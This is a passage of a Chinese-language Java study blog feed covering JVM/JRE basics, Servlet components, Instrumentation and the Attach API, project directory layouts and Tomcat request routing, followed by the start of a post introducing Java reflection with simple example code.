标准类库 （rt.jar）。</p><ul><li><p>**JRE（Java Runtime Enviroment） **</p><p>JRE 是 Java 的运行环境。面向 Java 程序的使用者，而不是开发者。如果你仅下载并安装了 JRE，那么你的系统只能运行 Java 程序。JRE 是运行 Java 程序所必须环境的集合，包含 JVM 标准实现及 Java 核心类库。它包括 Java 虚拟机、Java 平台核心类和支持文件。它不包含开发工具（编译器、调试器等）。</p></li><li><p><strong>JVM（Java Virtual Machine，java虚拟机）</strong></p><p>java虚拟机是java的运行时环境，提供了内存管理、垃圾回收、线程调度等功能，保证了 Java 程序的安全性、可移植性和高性能。对于不同的平台,Windows,Linux,Mac OS等,有具体不同的JVM版本。这些JVM屏蔽了平台的不同,提供了统一的运行环境，让Java代码无需考虑平台的差异，运行在不同的环境中。</p><blockquote><p>参考：<a href="https://javaguide.cn/java/jvm/jvm-intro.html">大白话带你认识 JVM</a></p></blockquote></li></ul></li></ul></li><li><p><strong>java web开发三大件</strong></p><p>在 Java Web 开发中，Servlet、Filter、和Listener被称为“三大件”，它们是Java EE中用于处理Web请求、响应和事件的三种核心组件。</p><ul><li><p><strong>Servlet</strong>：Servlet是运行在服务器端的Java程序，用于处理客户端（通常是浏览器）发送的请求，并生成动态响应。主要用于处理HTTP请求，比如GET和POST请求，接收到请求后生成HTML内容、处理表单数据、执行业务逻辑、与数据库交互等。</p><p>原理：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241025162021934.png" alt="image-20241025162021934" /></p></li><li><p><strong>Filter</strong>：介于Web容器和Servlet之间的过滤器，用于过滤未到达Servlet的请求或者由Servlet生成但还未返回响应。客户端请求从 Web 容器到达 Servlet 之前，会先经过 Filter，由 Filter 对 request 的某些信息进行处理之后交给 Servlet。同样，响应从 Servlet 传回 Web 容器之前，也会被 Filter 拦截，由 Filter 对 response 进行处理之后再交给 Web 容器。</p></li><li><p><strong>Listener</strong>：用于监听Web应用程序中各种事件（如会话创建、销毁、请求初始化、上下文加载等）的组件。当特定动作发生时，监听该动作的监听器就会自动调用对应的方法。通常用于执行一些事件驱动的任务，比如统计在线用户数、记录日志、监控应用状态等。</p></li></ul><blockquote><p>当我们在请求一个实现servlet-api规范的java web应用时，程序先自动执行 listener 监听器的内容，再去执行 filter 过滤器，如果存在多个过滤器则会组成过滤链，最后一个过滤器将会去执行 Servlet 的 service 方法，即 Listener -&gt; Filter -&gt; Servlet</p></blockquote></li><li><p><strong>Context</strong>：在Java Web应用中，Context通常指的是<strong>ServletContext</strong>，它是Web容器（如Tomcat、Jetty、JBoss等）为每个Web应用创建的上下文环境，类似于一个全局对象，用于存储Web应用的配置信息和资源。</p><p><strong>Context的作用</strong>：</p><ul><li><p>Web应用的全局信息管理：ServletContext在Web应用启动时被创建，并在整个应用的生命周期内都存在。它可以存储全局的配置信息，比如初始化参数、应用级别的属性等。</p></li><li><p>资源管理：通过ServletContext，Web应用可以访问Web应用的资源，比如Web应用目录中的文件、静态资源、属性文件等。</p></li><li><p>对象共享：ServletContext允许在不同的Servlet、Filter、Listener之间共享数据。开发者可以通过ServletContext的<code>setAttribute()</code>和<code>getAttribute()</code>方法，在不同组件之间共享对象。</p></li><li><p>请求转发：ServletContext也可以用于请求的转发和资源的请求，通过调用<code>getRequestDispatcher()</code>方法进行请求转发。</p></li></ul></li><li><p><strong>中间件（Middleware）</strong>：中间件是一种用于在不同应用、系统或组件之间进行连接和通信的软件层（一种组件），负责数据管理、通信和事务处理。它不局限于Web环境，而是适用于各种分布式系统和企业应用。</p></li><li><p><strong>Java Instrumentation</strong></p><p>它是一种在 Java 代码运行时动态修改字节码的技术。该功能主要由 Java SE 提供的 <code>java.lang.instrument</code> 包实现。它允许开发者在不修改源代码的情况下，通过代理或其他方式对类进行修改或增强。</p><p>开发者可以通过修改方法的字节码实现动态修改类代码。利用Instrument，开发者可以开发单独的代理Agent，实现对JVM进程的运行时监控，分析JVM进程运行时内存状态，甚至可以很方便地修改内存中类的字节码，修改或者扩展已有的功能。</p><blockquote><p><strong>Java agent和Java Instrumentation的区别</strong></p><p>简单来说，<strong>Java Agent 是一种在 JVM 启动时注入代码的机制，而 Instrumentation 提供了实际执行类字节码修改的能力</strong>。Java Agent 通过 Instrumentation API 实现字节码修改，是更高层次的抽象和应用。</p></blockquote></li><li><p><strong>Attach API</strong></p><p>Attach API 是 Java 虚拟机（JVM）中提供的一个 API，用于在 Java 应用程序运行时动态地加载或附加外部工具和代理（agents）到已启动的 JVM 进程上。这在诊断、性能分析和调试方面非常有用，因为它允许在不重新启动 JVM 的情况下附加工具，进行故障排查和性能监控。</p><p>白话：attach api 用于将java agent动态附加到运行中的JVM上，这样可以进一步使用Instrumentation API修改类字节码</p></li></ol><blockquote><table><thead><tr><th>API</th><th>作用</th><th>使用场景</th><th>特点与限制</th></tr></thead><tbody><tr><td><strong>Instrumentation API</strong></td><td>在运行时对类进行修改和管理</td><td>JVM 启动时加载的代理、性能监控、代码增强</td><td>可以修改类字节码，也可以重定义类；需与 Java Agent 配合</td></tr><tr><td><strong>Transform API</strong></td><td>类加载时拦截字节码并修改</td><td>类加载时的字节码修改，如日志注入、监控</td><td>Instrumentation API 的子集，不能独立使用</td></tr><tr><td><strong>Attach API</strong></td><td>动态附加代理到已运行的 JVM 上</td><td>动态附加代理，特别是远程调试和动态监控</td><td>不直接修改字节码，需借助 Instrumentation API</td></tr></tbody></table></blockquote><ol start="7"><li><p><strong>Hook</strong>：在计算机领域，hook（钩子）是一种技术，允许开发者在程序的正常执行路径中插入自己的代码，从而在特定的位置对程序的行为进行拦截、修改或增强。</p><p>恶意代码（例如内存马）通常会调用某些特定类和方法以达到目的。Hook 可以拦截这些方法的调用，从而发现和阻止恶意行为。</p></li><li><p><strong>Jar包（Java ARchive）</strong></p><p>JAR包可以将 Java 应用程序的多个 <code>.class</code> 文件、资源文件（如图片、配置文件）、以及依赖项封装成一个单独的文件。这样，分发和部署应用时，只需提供一个 JAR 包，避免发送多个文件的麻烦。实现模块化和插件化。</p></li></ol><h2 id="java运行原理"><a class="markdownIt-Anchor" href="#java运行原理"></a> java运行原理</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241031111240801.png" alt="image-20241031111240801" /></p><ol><li><p><strong>将Java 代码编译成字节码</strong>：<code>.java </code> 源码被 <code>javac.exe</code> 编译器编译成<code>.class</code>字节码文件。这个过程的大致执行流程：Java源代码-&gt; 词法分析器 -&gt; 语法分析器 -&gt; 语义分析器 -&gt; 字节码生成器-&gt; 最终生成字节码，其中任何一个节点执行失败就会造成编译失败；</p></li><li><p><strong>类加载</strong>：虚拟机通过类加载器（ClassLoader）把class文件和相关Java API加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的 Java 类型。</p></li><li><p><strong>字节码校验</strong>：为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，不会危害虚拟机的安全，Java虚拟机对输入的字节流走验证过程。验证阶段包括四个阶段：文件格式验证、元数据验证、字节码验证、符号引用验证。</p></li><li><p><strong>翻译执行</strong>：JVM 解释器会把字节码翻译成机器码交由操作系统执行</p><ul><li><p>解释执行：来一行代码，解释一行，大部分不常用的代码，都是采用这种方式。</p></li><li><p>即时编译：对于部分热点代码，将一个方法包含的所有字节码翻译成机器指令，以提高java虚拟机的运行效率。</p></li></ul></li></ol><h1 id="java项目目录结构"><a class="markdownIt-Anchor" href="#java项目目录结构"></a> Java项目目录结构</h1><p>在Java项目中，目录结构通常遵循一定的标准，以保持代码的组织清晰、可维护性高。</p><p>参考：<a href="https://segmentfault.com/a/1190000022110134">看完这篇，别人的开源项目结构应该能看懂了</a></p><h2 id="标准mavengradle项目目录结构"><a class="markdownIt-Anchor" href="#标准mavengradle项目目录结构"></a> 标准Maven/Gradle项目目录结构</h2><p>以下是标准的基于 Maven 或 Gradle Java 的 Java 项目目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">my-java-project/</span><br><span class="line">│── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/                  # 存放Java源代码</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           ├── App.java   # 主要的Java应用程序</span><br><span class="line">│   │   │           ├── service/   # 业务逻辑层</span><br><span class="line">│   │   │           ├── dao/       # 数据访问层（通常用于数据库操作）</span><br><span class="line">│   │   │           ├── model/     # 数据模型（实体类）</span><br><span class="line">│   │   │           └── utils/     # 工具类</span><br><span class="line">│   │   ├── resources/             # 存放资源文件（配置文件、模板等）</span><br><span class="line">│   │       ├── application.properties  # 配置文件</span><br><span class="line">│   │       ├── log4j.properties        # 日志配置文件</span><br><span class="line">│   │       └── static/                  # 静态资源（如HTML、CSS、JavaScript）</span><br><span class="line">│   ├── test/                            # 测试代码目录</span><br><span class="line">│   │   ├── java/</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           ├── AppTest.java      # 单元测试代码</span><br><span class="line">│   │   ├── resources/                    # 测试资源文件</span><br><span class="line">│   │       ├── test-application.properties  # 测试环境配置文件</span><br><span class="line">│── pom.xml (Maven项目配置文件)</span><br><span class="line">│── build.gradle (Gradle项目配置文件)</span><br><span class="line">│── settings.gradle (Gradle配置文件)</span><br><span class="line">│── .gitignore (Git忽略文件)</span><br><span class="line">│── README.md (项目说明文档)</span><br><span class="line">│── target/ (Maven 构建输出目录，通常不会提交到版本控制)</span><br><span class="line">│── build/ (Gradle 构建输出目录，通常不会提交到版本控制)</span><br><span class="line">│── libs/ (存放外部依赖的JAR包)</span><br></pre></td></tr></table></figure><ol><li><p><strong><code>src/main/java/</code></strong></p><ul><li>主要的Java源代码文件存放位置。</li><li>通常按照包结构进行组织，如 <code>com.example</code>。</li></ul></li><li><p><strong><code>src/main/resources/</code></strong>：</p><ul><li>存放资源文件，如 <code>application.properties</code>（Spring Boot 配置）或 <code>log4j.properties</code>（日志配置）。</li><li><code>static/</code> 用于存放静态资源，如 HTML、CSS、JavaScript（Web 应用中）。</li></ul></li><li><p><strong><code>src/test/java/</code></strong></p><ul><li><p>存放测试代码，通常使用 JUnit 或 TestNG 进行单元测试。</p></li><li><p>结构与 <code>src/main/java/</code> 类似。</p></li></ul></li><li><p><strong><code>src/test/resources/</code></strong></p><p>存放测试相关的资源，如测试环境下的 <code>application.properties</code>。</p></li><li><p><strong><code>pom.xml</code>（Maven项目）</strong>：</p><p>用于Maven项目管理依赖、构建信息、插件等。</p></li><li><p><strong><code>build.gradle</code> &amp; <code>settings.gradle</code>（Gradle项目）</strong>：</p><p>Gradle 项目的构建配置文件。</p></li><li><p><strong><code>.gitignore</code></strong></p><p>指定 Git 需要忽略的文件（如 <code>target/</code>、<code>build/</code>）。</p></li><li><p><strong><code>README.md</code></strong></p><p>项目的文档说明，通常包含项目介绍、使用方法、开发指南等信息。</p></li><li><p><strong><code>target/</code> &amp; <code>build/</code></strong></p><ul><li><p>编译后的输出目录，<code>target/</code> 用于 Maven，<code>build/</code> 用于 Gradle。</p></li><li><p>这些目录通常不会提交到版本控制（在 <code>.gitignore</code> 中忽略）。</p></li></ul></li><li><p><strong><code>libs/</code></strong>：</p><p>存放额外的 JAR 依赖（如果使用了本地 JAR）。</p></li></ol><h2 id="spring-boot项目目录结构"><a class="markdownIt-Anchor" href="#spring-boot项目目录结构"></a> Spring Boot项目目录结构</h2><p>基于 Spring Boot 开发的 Java 项目目录结构与标准的 Maven 或 Gradle Java 项目类似，但有一些特定的调整，以便于支持 Spring Boot 的特性，如自动配置、嵌入式服务器和约定优于配置。</p><p>以下是一个典型的 <strong>Spring Boot</strong> 项目目录结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">my-springboot-app/</span><br><span class="line">│── src/</span><br><span class="line">│   ├── main/</span><br><span class="line">│   │   ├── java/                  </span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           ├── MySpringBootApplication.java  # Spring Boot 启动类</span><br><span class="line">│   │   │           ├── controller/                  # 控制层（处理 HTTP 请求）</span><br><span class="line">│   │   │           ├── service/                     # 业务逻辑层</span><br><span class="line">│   │   │           ├── repository/                  # 数据访问层 (类似 DAO)</span><br><span class="line">│   │   │           ├── model/                       # 数据模型 (Entity)</span><br><span class="line">│   │   │           ├── config/                      # 配置类 (如 Security、CORS)</span><br><span class="line">│   │   │           └── utils/                       # 工具类</span><br><span class="line">│   │   ├── resources/                               </span><br><span class="line">│   │   │   ├── application.properties              # Spring Boot 配置 (YAML 也可以)</span><br><span class="line">│   │   │   ├── application.yml                     # 配置文件（另一种格式）</span><br><span class="line">│   │   │   ├── static/                             # 静态资源（HTML, CSS, JS）</span><br><span class="line">│   │   │   ├── templates/                          # 存放 Thymeleaf 或 Freemarker 模板</span><br><span class="line">│   │   │   ├── messages.properties                 # 国际化资源文件</span><br><span class="line">│   │   │   ├── logback-spring.xml                  # 日志配置</span><br><span class="line">│   │   │   └── data.sql                            # 启动时初始化数据库数据</span><br><span class="line">│   ├── test/                                       </span><br><span class="line">│   │   ├── java/</span><br><span class="line">│   │   │   └── com/</span><br><span class="line">│   │   │       └── example/</span><br><span class="line">│   │   │           ├── MySpringBootApplicationTests.java  # 测试类</span><br><span class="line">│   │   │           ├── controller/                        # 控制层测试</span><br><span class="line">│   │   │           ├── service/                           # 业务层测试</span><br><span class="line">│   │   │           ├── repository/                        # 数据层测试</span><br><span class="line">│── pom.xml (Maven 构建配置)</span><br><span class="line">│── build.gradle (Gradle 构建配置)</span><br><span class="line">│── .gitignore</span><br><span class="line">│── README.md</span><br><span class="line">│── target/ (Maven 编译输出)</span><br><span class="line">│── build/ (Gradle 编译输出)</span><br><span class="line">│── Dockerfile (可选，Docker 部署)</span><br><span class="line">│── scripts/ (可选，存放 Shell 或 SQL 脚本)</span><br><span class="line">│── src/main/docker/ (可选，Docker 配置)</span><br><span class="line">│── src/main/resources/banner.txt (可选，Spring Boot 启动 Banner)</span><br></pre></td></tr></table></figure><ol><li><p><strong><code>MySpringBootApplication.java</code></strong></p><p>Spring Boot 启动类，是应用的入口。该类会启用自动配置，管理 <code>Bean</code>，并嵌入 Web 服务器（如 Tomcat）。</p></li><li><p><strong>分层结构</strong></p><p>Spring Boot 推荐按照 <code>Controller-Service-Repository</code> 三层架构组织代码：</p><ul><li><code>controller/</code>：负责接收和返回 HTTP 请求</li><li><code>service/</code>：负责处理业务逻辑</li><li><code>repository/</code>：负责与数据库交互，通常使用 <code>JpaRepository</code> 或 <code>CrudRepository</code></li></ul></li><li><p><strong><code>application.properties</code> 或 <code>application.yml</code></strong></p><p>Spring Boot 推荐将配置信息放在 <code>src/main/resources/application.properties</code> 或 <code>application.yml</code></p></li><li><p><strong><code>templates/</code> 和 <code>static/</code></strong></p><ul><li><code>templates/</code>：用于存放 <strong>Thymeleaf</strong>、<strong>Freemarker</strong> 等模板引擎的 HTML 视图文件。</li><li><code>static/</code>：用于存放静态资源，如 CSS、JS、图片等（Spring Boot 会自动映射）。</li></ul></li><li><p><strong>日志配置</strong></p><p>默认情况下，Spring Boot 使用 <strong>Logback</strong> 进行日志管理，可通过 <code>logback-spring.xml</code> 配置。</p></li><li><p><strong>数据初始化</strong></p><p>可以在 <code>resources/</code> 目录下放置 <code>schema.sql</code>（数据库结构）和 <code>data.sql</code>（默认数据），应用启动时自动执行。</p></li><li><p><strong>Docker &amp; DevOps</strong></p><ul><li><p>许多 Spring Boot 项目会添加 <code>Dockerfile</code> 进行容器化部署。</p></li><li><p>可能还会包含 <code>scripts/</code> 目录，存放 Shell 脚本或 SQL 脚本。</p></li></ul></li></ol><h2 id="一些特殊文件"><a class="markdownIt-Anchor" href="#一些特殊文件"></a> 一些特殊文件</h2><ul><li><p><strong><code>MANIFEST.MF</code></strong> ：用于配置和描述 JAR 文件的元数据。它位于 JAR 文件的 <code>META-INF</code> 目录下，主要作用是提供关于 JAR 文件的描述信息和配置指定属性，以控制 JAR 的执行方式和行为。</p></li><li><p><strong><code>web.xml</code></strong>：配置 Web 应用的相关组件和行为，在项目部署到 Servlet 容器（如 Tomcat）时，容器会读取这个文件来初始化应用。主要包含Servlet配置、Filter配置、Listener配置、error-page配置等</p><blockquote><p>注意：在 Servlet 3.0 之后，可以通过 <strong>注解</strong>（如 <code>@WebServlet</code>、<code>@WebFilter</code>）来替代 <code>web.xml</code> 中的大部分配置。</p></blockquote></li></ul><h1 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h1><p>参考：<a href="https://segmentfault.com/a/1190000023475177">Tomcat 架构原理解析到架构设计借鉴</a></p><p><strong>请求定位 Servlet 的过程</strong></p><p>一个请求是如何定位到让哪个 <code>Wrapper</code> 的 <code>Servlet</code> 处理的？答案是，Tomcat 是用 Mapper 组件来完成这个任务的。</p><p><code>Mapper</code> 组件的功能就是将用户请求的 <code>URL</code> 定位到一个 <code>Servlet</code>，它的工作原理是：<code>Mapper</code>组件里保存了 Web 应用的配置信息，其实就是<strong>容器组件与访问路径的映射关系</strong>，比如 <code>Host</code>容器里配置的域名、<code>Context</code>容器里的 <code>Web</code>应用路径，以及 <code>Wrapper</code>容器里 <code>Servlet</code> 映射的路径，你可以想象这些配置信息就是一个多层次的 <code>Map</code>。</p><p>当一个请求到来时，<code>Mapper</code> 组件通过解析请求 URL 里的域名和路径，再到自己保存的 Map 里去查找，就能定位到一个 <code>Servlet</code>。请你注意，一个请求 URL 最后只会定位到一个 <code>Wrapper</code>容器，也就是一个 <code>Servlet</code>。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/20200407192105.png" alt="img" /></p><p>假如有用户访问一个 URL，比如图中的<code>http://user.shopping.com:8080/order/buy</code>，Tomcat 如何将这个 URL 定位到一个 Servlet 呢？</p><ol><li><strong>首先根据协议和端口号确定 Service 和 Engine</strong>。Tomcat 默认的 HTTP 连接器监听 8080 端口、默认的 AJP 连接器监听 8009 端口。上面例子中的 URL 访问的是 8080 端口，因此这个请求会被 HTTP 连接器接收，而一个连接器是属于一个 Service 组件的，这样 Service 组件就确定了。我们还知道一个 Service 组件里除了有多个连接器，还有一个容器组件，具体来说就是一个 Engine 容器，因此 Service 确定了也就意味着 Engine 也确定了。</li><li><strong>根据域名选定 Host。</strong> Service 和 Engine 确定后，Mapper 组件通过 URL 中的域名去查找相应的 Host 容器，比如例子中的 URL 访问的域名是<code>user.shopping.com</code>，因此 Mapper 会找到 Host2 这个容器。</li><li><strong>根据 URL 路径找到 Context 组件。</strong> Host 确定以后，Mapper 根据 URL 的路径来匹配相应的 Web 应用的路径，比如例子中访问的是 /order，因此找到了 Context4 这个 Context 容器。</li><li><strong>根据 URL 路径找到 Wrapper（Servlet）。</strong> Context 确定后，Mapper 再根据 web.xml 中配置的 Servlet 映射路径来找到具体的 Wrapper 和 Servlet。</li></ol><h1 id="基础语法"><a class="markdownIt-Anchor" href="#基础语法"></a> 基础语法</h1><p>基本语法：<a href="https://blog.csdn.net/m0_63815035/article/details/141575029">Java教程：入门基础【十万字详解】</a></p><p>对象、类等概念的总结：<a href="https://www.runoob.com/java/java-object-classes.html">Java 对象和类</a></p><p>java package：<a href="https://blog.csdn.net/Oliver9987/article/details/138622169">Java中的包（package）是什么和如何使用它们</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Java』Java 反射机制</title>
      <link href="/posts/9c11.html"/>
      <url>/posts/9c11.html</url>
      
        <content type="html"><![CDATA[<p>本文主要对 Java 反射机制原理、使用方法进行了介绍。</p><h1 id="什么是-java-反射"><a class="markdownIt-Anchor" href="#什么是-java-反射"></a> 什么是 Java 反射？</h1><p>通常，java在编译之后，会将Java代码生成为class源文件，JVM启动时，将会载入所有的源文件，并将类型信息存放到方法区中；将所有对象实例存放在Java堆中，同时也会保存指向类型信息的指针。</p><p>以下分两种情况来分析，直接使用类和使用反射的区别，以此理解反射的实现原理。</p><p><strong><mark>直接使用类</mark></strong></p><p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>(); <span class="comment">//直接初始化，「正射」</span></span><br><span class="line">apple.setPrice(<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>上面这样子进行类对象的初始化，我们可以理解为「正」。</p><p><strong><mark>反射</mark></strong></p><p>在一个方法中，如果我们不知道在**实际运行（runtime）**时，它将要处理的对象是谁，它的类型信息是怎么样的（即在一开始并不知道我要初始化的类对象是什么），那我们如何访问这个对象或为这个对象创建一个新的实例呢？</p><p>与直接使用类相反，反射在运行时，通过读取方法区中的字节码，来动态的找到其反射的类以及类的方法和属性等（实际上就是在运行时，根据全类型名在方法区找对应的类），用这些类型信息完成对该类实例的操作，其实就是直接使用类的一个逆向使用。</p><p>例如，我们使用 JDK 提供的反射 API 进行反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类的 Class 对象实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.chenshuyi.reflect.Apple&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据 Class 对象实例获取 Constructor 对象</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Constructor 对象的 newInstance 方法获取反射类对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取方法的 Method 对象</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// 利用 invoke 方法调用方法</span></span><br><span class="line">method.invoke(object, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>上面两段代码的执行结果，其实是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（Apple），而第二段代码则是在运行时通过字符串值才得知要运行的类（com.chenshuyi.reflect.Apple）。</p><p><mark><strong>类的正常加载过程和Java反射的过程</strong></mark>，如图：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20250402151013368.png" alt="image-20250402151013368" /></p><p>所以说什么是反射？</p><p><mark><strong>Java 反射机制</strong>是指程序在<strong>运行时</strong>才知道要操作的类是什么，并且能够在运行时动态地获取类的信息（如类名、方法、字段、构造函数等），并且可以<strong>动态地调用对象的方法或访问字段</strong>。</mark></p><h1 id="为什么需要java反射"><a class="markdownIt-Anchor" href="#为什么需要java反射"></a> 为什么需要Java反射？</h1><p>Java 是静态语言，编译时就需要确定类的结构。这种方式虽然安全，但在需要<strong>高度灵活、动态扩展、解耦合</strong>的场景下就显得<strong>束手束脚</strong>。</p><p><strong>反射机制的作用就是打破这种编译期限制，让你可以：</strong></p><ul><li>在运行时动态加载类</li><li>在运行时动态创建对象、访问字段、调用方法</li><li>提供更加通用、通配、框架化的设计</li></ul><h2 id="实际应用场景"><a class="markdownIt-Anchor" href="#实际应用场景"></a> 实际应用场景</h2><ol><li><p><strong>插件系统、热插拔架构</strong></p><p>插件（比如 IDEA 插件、游戏插件）通常是独立模块，不在主程序中直接引用。</p><p>主程序运行时通过反射加载这些类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; pluginClass = Class.forName(<span class="string">&quot;com.plugin.MyPlugin&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">plugin</span> <span class="operator">=</span> pluginClass.getDeclaredConstructor().newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> pluginClass.getMethod(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">run.invoke(plugin);</span><br></pre></td></tr></table></figure><p>这就实现了模块解耦，主程序无需编译时就知道所有插件。</p></li><li><p><strong>序列化/反序列化框架</strong></p><p>如 <strong>Jackson、Gson</strong> 等 JSON 解析器：</p><ul><li>通过反射读取 Java 类的字段</li><li>动态地将 JSON 字符串转换成对象，或把对象转成 JSON</li></ul></li><li><p><strong>单元测试框架</strong></p><p>如 <strong>JUnit</strong>：</p><ul><li>使用反射查找测试方法（被 <code>@Test</code> 注解的）</li><li>然后在运行时调用这些方法进行测试</li></ul></li></ol><h1 id="反射常用api"><a class="markdownIt-Anchor" href="#反射常用api"></a> 反射常用API</h1><h2 id="获取反射中的class对象"><a class="markdownIt-Anchor" href="#获取反射中的class对象"></a> 获取反射中的Class对象</h2><p>在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。</p><p>在 Java API 中，获取 Class 类对象有三种方法：</p><ol><li><p><strong>Class.forName 静态方法</strong></p><ul><li>适用场景：当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。不需要编译时已知类型</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>.class 方法</strong></p><ul><li>适用场景：只能应用于编译时已知类型的 Class。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure></li><li><p><strong>类对象的 getClass() 方法。</strong></p><ul><li>适用场景：已有对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> str.getClass();</span><br></pre></td></tr></table></figure></li></ol><h2 id="通过反射创建类对象"><a class="markdownIt-Anchor" href="#通过反射创建类对象"></a> 通过反射创建类对象</h2><ol><li><p><strong>通过 Class 对象的 newInstance() 方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> (Apple)clz.newInstance();</span><br></pre></td></tr></table></figure></li><li><p><strong>通过 Constructor 对象的 newInstance() 方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> (Apple)constructor.newInstance();</span><br></pre></td></tr></table></figure></li></ol><p>区别：</p><p>通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 